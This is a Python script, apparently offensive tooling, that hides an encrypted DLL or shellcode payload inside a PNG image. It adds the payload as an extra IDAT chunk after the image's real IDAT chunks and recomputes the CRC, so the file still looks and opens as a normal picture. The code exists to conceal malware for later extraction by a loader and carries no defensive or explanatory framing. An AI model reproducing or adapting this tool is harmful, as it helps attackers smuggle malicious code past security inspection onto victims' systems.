import struct
import binascii
import sys

# function to calculate the CRC32 checksum
def crc32(data):
    crc = binascii.crc32(data)
    return crc & 0xffffffff

if len(sys.argv) != 4:
    print(f"Usage: python {sys.argv[0]} <input_png> <encrypted_dll> <output_png>")
    sys.exit(1)

input_png = sys.argv[1]
encrypted_dll = sys.argv[2]
output_png = sys.argv[3]

# open the PNG file in binary mode
with open(input_png, 'rb') as f:
    # Read the PNG signature bytes
    signature = f.read(8)
    if signature != b'\x89PNG\r\n\x1a\n':
        raise ValueError('Not a valid PNG file')

    # read through the PNG file and find the location of the last IDAT section
    # we also split the PNG chunks into an array so later we pack them as the new PNG file.
    location = None
    chunks = []
    while True:
        chunk_header = f.read(8)
        if not chunk_header:
            raise ValueError('No IDAT sections found in PNG file')
        chunk_length, chunk_type = struct.unpack('>I4s', chunk_header)
        chunk_data = f.read(chunk_length)
        crc = f.read(4)
        if chunk_type == b'IDAT':
            location = f.tell() - 8
        chunks.append((chunk_header, chunk_data, crc))
        if chunk_type == b'IEND':
            break
    if location is None:
        raise ValueError('No IDAT sections found in PNG file')

    # open the shellcode read its contents
    with open(encrypted_dll, 'rb') as data_file:
        data = data_file.read()

    # Append a new IDAT section with shellcode to the PNG file containing
    found_idat = False
    shellcode_written_to_file = False
    with open(output_png, 'wb') as output:
        output.write(signature)
        for chunk_header, chunk_data, crc in chunks:
            chunk_length, chunk_type = struct.unpack('>I4s', chunk_header)
            if chunk_type == b'IDAT': #just to check if we have passed through the IDAT sections
                found_idat = True     
            if chunk_type != b'IDAT' and found_idat and (not shellcode_written_to_file):
                output.write(struct.pack('>I', len(data)))
                output.write(b'IDAT')
                output.write(data)
                shellcode_crc = crc32(b'IDAT' + data)
                output.write(struct.pack('>I', shellcode_crc))
                shellcode_written_to_file = True # so we don't write it multiple times    
            output.write(chunk_header)
            output.write(chunk_data)
            output.write(crc)

print('Done')
